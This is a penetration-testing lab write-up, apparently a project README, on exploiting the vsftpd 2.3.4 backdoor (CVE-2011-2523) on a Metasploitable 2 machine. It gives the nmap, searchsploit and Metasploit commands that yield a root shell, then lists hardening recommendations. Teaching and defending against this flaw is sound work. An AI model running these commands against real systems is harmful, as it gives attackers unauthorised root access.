# Exploitation of vsftpd 2.3.4 Backdoor (Metasploitable 2)

## 📌 Overview
This project documents the exploitation of the **vsftpd 2.3.4** service running on a vulnerable Metasploitable 2 machine.  
The service contains a **backdoor vulnerability (CVE-2011-2523)** that allows **unauthenticated remote code execution** and grants a **root shell** on the target.

---

## 🔍 1. Reconnaissance & Target Analysis

We begin with an **Nmap scan** to identify open ports and running services:

```bash
nmap -sV -O 192.168.1.6
```

### Result:
![Nmap Scan](./Screenshot%202025-07-22%20154954.png)

- FTP (21/tcp) → **vsftpd 2.3.4**
- SSH (22/tcp) → OpenSSH 4.7p1
- Telnet (23/tcp), SMTP (25/tcp), DNS (53/tcp), HTTP (80/tcp), RPC, Samba, etc.

📌 The most critical finding: **vsftpd 2.3.4**, known for a malicious backdoor.

---

## ⚡ 2. Vulnerability Identification

### Searchsploit
We search for exploits related to `vsftpd`:

```bash
searchsploit vsftpd
```

![Searchsploit Results](./Screenshot%202025-07-22%20155036.png)

- Found exploit: `vsftpd 2.3.4 - Backdoor Command Execution`  
- Path: `unix/remote/17491.rb`

### Metasploit Module
Inside `msfconsole`:

```bash
search vsftpd
```

![Metasploit Module Search](./Screenshot%202025-07-22%20160110.png)

- `exploit/unix/ftp/vsftpd_234_backdoor` → Rank: Excellent

**CVE ID:** [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)  
**CVSS Score:** 10.0 (Critical)  
**Type:** Remote Code Execution via Backdoor

---

## 💣 3. Exploitation

### Using Metasploit
We load the exploit and set the target host:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.6
exploit
```

![Metasploit Exploit Execution](./Screenshot%202025-07-22%20160211.png)

- Exploit triggered successfully.
- Shell opened as **root**.

---

## 🛠 4. Post-Exploitation

We now verify system access and privileges:

```bash
id
uid=0(root) gid=0(root)
```

```bash
sudo -l
```

![Post Exploitation Root Access](./Screenshot%202025-07-22%20160249.png)

- Root privileges confirmed.  
- Complete control of the system achieved.  

---

## 🛡 5. Recommendations

1. **Remove/Upgrade vsftpd 2.3.4**  
   Replace with a patched version or disable FTP if not required.

2. **Use Secure Alternatives**  
   Prefer **SFTP (over SSH)** or **FTPS (TLS/SSL)**.

3. **Restrict Access**  
   Limit port `21` access to trusted IPs via firewall rules.

4. **Patch Management**  
   Regularly update services (SSH, Apache, Samba, etc.).

5. **Harden Configurations**  
   - Disable anonymous logins.  
   - Enforce strong password policies.  
   - Minimize exposed services.  

6. **Deploy IDS/IPS**  
   Detect unusual shell sessions or port activity.

7. **Vulnerability Scanning**  
   Use **Nessus/OpenVAS** for proactive assessments.

---

## 📽 Video Demonstration
- [Reconnaissance & Target Analysis](https://youtu.be/vQekjfnPsOU)  
- [Exploitation Walkthrough](https://youtu.be/2gm2FEWfxRs?si=qUpHkyL869MiMjo8)  

---

## ✅ Conclusion
This penetration test successfully exploited **vsftpd 2.3.4** via a **backdoor vulnerability (CVE-2011-2523)**, granting remote root access.  

The exploit required minimal effort, demonstrating the **severe risks of outdated software**.  
Mitigations include **patching, service hardening, and continuous monitoring**.
